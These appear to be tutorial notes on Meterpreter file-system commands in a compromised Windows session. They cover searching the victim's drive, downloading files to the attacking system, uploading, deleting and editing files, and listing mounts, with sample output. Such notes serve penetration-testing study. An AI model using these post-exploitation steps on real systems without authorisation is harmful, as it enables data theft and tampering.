## Printing working directory
```python
meterpreter > pwd
C:\Windows\system32
```

## Changing directory
```python
meterpreter > cd ..
meterpreter > pwd
C:\Windows
```

# Searching file in the drive
```python
meterpreter > search -f download.txt -d C:/
Found 1 result...
=================

Path             Size (bytes)  Modified (UTC)
----             ------------  --------------
C:\download.txt  0             2023-03-13 12:14:12 +0530
```
- It search download.txt in the C drive 
- The -f parameter is used to specify the file pattern to search for, and the -d parameter tells the directory which file is to be searched.

## Downloading file to our attacking system from victim machine
```python
meterpreter > download C:\\download.txt
[*] Downloading: C:\download.txt -> /home/hyok/download.txt
[*] Completed  : C:\download.txt -> /home/hyok/download.txt
```
Note - You need to use double-slashes when you give the Windows path in the download command.

## uploading file to the target machine
```python
meterpreter > upload /home/hyok/download.txt
[*] Uploading  : /home/hyok/download.txt -> download.txt
[*] Completed  : /home/hyok/download.txt -> download.txt
```

## Removing file from target machine
```python
meterpreter > rm download.txt
```

## Editing files using meterpreter 
```python
meterpreter > edit download.txt
```
Note - Which uses `vim` so all the editor's commands are available

## Listing all the mount drives on the target machine 
```python
meterpreter > show_mount

Mounts / Drives
===============

Name  Type   Size (Total)  Size (Free)  Mapped to
----  ----   ------------  -----------  ---------
C:\   fixed  60.00 GiB     40.93 GiB


Total mounts/drives: 1
```

## To display all the available commands, you can use the help command followed by the group of commands you want to display:
```python
meterpreter > help File system Commands 
Stdapi: File system Commands 
============================ 
Command Description 
------- ----------- 
cat Read the contents of a file to the screen 
cd Change directory checksum 
Retrieve the checksum of a file.
```